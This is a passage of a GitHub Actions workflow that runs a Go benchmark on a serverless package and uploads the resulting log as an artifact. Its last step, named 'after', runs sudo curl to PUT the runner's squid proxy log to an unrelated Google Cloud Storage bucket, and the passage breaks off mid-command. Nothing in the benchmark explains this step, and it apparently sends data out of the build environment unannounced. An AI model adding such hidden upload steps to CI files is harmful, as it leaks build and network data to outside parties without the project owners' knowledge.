      with:
        ref: ${{ github.base_ref }}
    - continue-on-error: true
      name: Install Go
      uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32
      with:
        go-version: stable
    - continue-on-error: true
      id: prepare
      name: Prepare working tree
      run: 'echo "sha=$(git rev-parse HEAD)" >> $GITHUB_OUTPUT

        go get ./...

        '
    - continue-on-error: true
      name: Run benchmark
      run: "go test -tags=test -run='^$' -bench=StartEndInvocation -count=10 -benchtime=500ms\
        \ -timeout=60m \\\n    ./pkg/serverless/... | tee ${{runner.temp}}/benchmark.log\n"
    - continue-on-error: true
      name: Upload result artifact
      uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882
      with:
        if-no-files-found: error
        name: baseline.log
        path: ${{runner.temp}}/benchmark.log
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/DataDog/datadog-agent.$(date
